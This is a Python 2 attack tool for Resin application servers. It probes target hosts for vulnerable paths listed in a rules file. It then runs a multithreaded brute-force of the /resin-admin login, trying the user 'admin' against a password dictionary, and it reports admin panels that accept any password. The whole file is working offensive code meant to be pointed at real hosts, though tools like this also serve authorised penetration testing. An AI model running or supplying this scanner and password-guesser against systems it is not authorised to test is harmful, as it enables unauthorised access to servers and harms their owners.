# -*- coding: utf-8 -*-
__author__ = 'gakki429'

import optparse
import requests
import os
import sys
import time
import traceback
from multiprocessing.pool import ThreadPool

requests.packages.urllib3.disable_warnings()

_time = time.time()
exception = False

def print_log(stdout, outfile='', Success=True, end='\n'):
    if Success:
        if outfile:
            if 'ssrf' in stdout:
                print '\033[1;31;40m[SSRF] \033[1;32;40m{}\033[0m{}{}'.format(stdout[:5], stdout[5:], end),
                stdout = '[SSRF] ' + stdout
            else:
                print '\033[1;32;40m{}\033[0m{}{}'.decode('utf-8').format(stdout[:5], stdout[5:], end),
            open(outfile, 'ab').write(stdout.encode('utf-8')+'\n')
        else:
            print '{}{}{}'.format(stdout[:5], stdout[5:], end),
    else:
        print '\033[1;31;40m{}\033[0m{}{}'.format(stdout[:5], stdout[5:], end),


def Resin_Vuln_Rules():
    _rules = open(options.vulns, 'rb').read().splitlines()
    vuln_rules = []
    for path_rule in _rules:
        vuln_rules.append(path_rule.split(':::'))
    return vuln_rules

def Thread_Brust_Login(host):
    '''Brust Resin Admin Login'''
    def _Login_Url(host):
        paths = [
            '/resin-admin/j_security_check?j_uri=status.php',
        ]
        for path in paths:
            try:
                url = '{}{}'.format(host, path)
                resp = requests.get(url, verify=False)
                if 'Resin Admin' in resp.content:
                    return url
                else:
                    flag_list = ['<th>Resin home:</th>', 'The Resin version', 'Resin Summary']
                    for flag in flag_list:
                        if flag in resp.content:
                            '''存在权限控制错误，直接进入后台的情况'''
                            _nonlocal['success'] = True
                            msg = '[{}] {} {}'.decode('utf-8').format(resp.status_code, u'配置错误，任意用户密码登录', url)
                            print_log(msg, options.reports)
                            return
            except:
                if exception:
                    print_log('[ - ] Exception\n\033[1;31;40m{}\033[0m'.format(traceback.format_exc()), Success=False, end='')
                pass
            finally:
                print_log('[ + ] Resin Admin Login: {}'.format(host))
        return

    def Resin_Admin_Login(url, user, pwd):
        # nonlocal log
        # nonlocal success
        if _nonlocal['success']:
            return
        else:
            try:
                flag_list = ['<th>Resin home:</th>', 'The Resin version', 'Resin Summary']
                data = {
                    'j_username': user,
                    'j_password': pwd,
                }
                resp = requests.post(url, data=data, timeout=(4, 20), verify=False)
                print_log('\r[{}] {} {}/{}'.format(
                            resp.status_code, len(resp.content), user, pwd).ljust(40), end='')
                for flag in flag_list:
                    if resp.status_code == 408 or flag in resp.content:
                        if not _nonlocal['success']:
                            '''解决任意密码登录的情况，减少输出'''
                            _nonlocal['success'] = True
                            _nonlocal['msg'] = '[{}] User: {}, Password: {} {}'.format(resp.status_code, user, pwd, url)
            except:
                if exception:
                    print_log('[ - ] Exception\n\033[1;31;40m{}\033[0m'.format(traceback.format_exc()), Success=False, end='')
                pass

    _nonlocal = {}
    _nonlocal['msg'] = ''
    _nonlocal['success'] = False
    url = _Login_Url(host)
    if _nonlocal['success']:
        return
    if url:
        print_log('[ + ] Start Brust Admin Login')
        Brust_Thread = ThreadPool(options.thread_num)
        user_list = ['admin']
        pwd_list = open(options.dict, 'rb').read().splitlines()
        args = []
        for user in user_list:
            for pwd in pwd_list:
                args.append([url, user, pwd.replace('{user}', user)])
        Brust_Thread.map(lambda x: Resin_Admin_Login(*x), args)
        Brust_Thread.close()
        Brust_Thread.join()
        print
        if _nonlocal['msg']:
            print_log(_nonlocal['msg'], options.reports)

def Resin_Work(host):
    '''Test Resin Main Work'''
    def Vuln_Test(host, path_rule):
        try:
            path, rule = path_rule
            url = '{}{}'.format(host, path)
            resp = requests.get(url, allow_redirects=False, timeout=(10, 20), verify=False)
            if (rule in resp.content) and (not _nonlocal['original'] == resp.content):
                msg = '[{}] {}'.format(resp.status_code, url)
                print_log(msg, options.reports)
                if 'status.php' in msg:
                    _nonlocal['Brust_Login'] = True
        except:
            if exception:
                print_log('[ - ] Exception\n\033[1;31;40m{}\033[0m'.format(traceback.format_exc()), Success=False, end='')
            pass

    _nonlocal = {}
    _nonlocal['Brust_Login'] = False
    try:
        resp = requests.get('{}/original_test_resin.txt'.format(host), allow_redirects=False, 
                            timeout=(10, 20), verify=False)
        _nonlocal['original']  = resp.content
        try:
            server = resp.headers['Server']
        except:
            server = 'None'
        print_log('[ + ] Version: {} URL: {}'.format(server, host), options.reports)
        vuln_rules = Resin_Vuln_Rules()
        Vuln_Thread = ThreadPool(options.thread_num)
        Vuln_Thread.map(lambda x: Vuln_Test(*[host, x]), vuln_rules)
        Vuln_Thread.close()
        Vuln_Thread.join()
        if _nonlocal['Brust_Login']:
            Thread_Brust_Login(host)
    except:
        if exception:
            print_log('[ - ] Exception\n\033[1;31;40m{}\033[0m'.format(traceback.format_exc()), Success=False, end='')
        pass

if __name__ == '__main__':
    
    parser = optparse.OptionParser(
        'usage: python %prog [options]\n(e.g.: python %prog -u [http://www.resin.com/ | targets.txt])')
    parser.add_option('-u', '--url', dest='url', 
                        type='string', help='Target url or file')
    parser.add_option('-t', '--threads', dest='thread_num', 
                        type='int', default=10, help='Number of threads. default: 10')
    parser.add_option('-c', '--vulns', dest='vulns', 
                        type='string', default='config/rules.txt', help='Rules of Resin Poc. default: config/rules.txt')
    parser.add_option('-d', '--dict', dest='dict', 
                        type='string', default='config/xunfeng_pwd.txt', help='Dict file used to brute Resin. default: config/xunfeng_pwd.txt')
    parser.add_option('-r', '--reports', dest='reports', 
                        type='string', default='reports/results.txt', help='Report scan results. default: reports/results.txt')

    (options, args) = parser.parse_args()
    if options.url == None or options.url == "":
        parser.print_help()
        sys.exit()

    if os.path.isfile(options.url):
        targets = set(open(options.url, 'rb').read().splitlines())
    else:
        targets = [options.url]
    print_log('[ + ] Total Target: {}'.format(len(targets)), options.reports)
    for target in targets:
        start_time = time.time()
        Resin_Work(target)
        print_log('[ + ] Time Cost: {:.2f}, Total Time Cost: {:.2f}'.format(time.time()-start_time, time.time()-_time), options.reports)
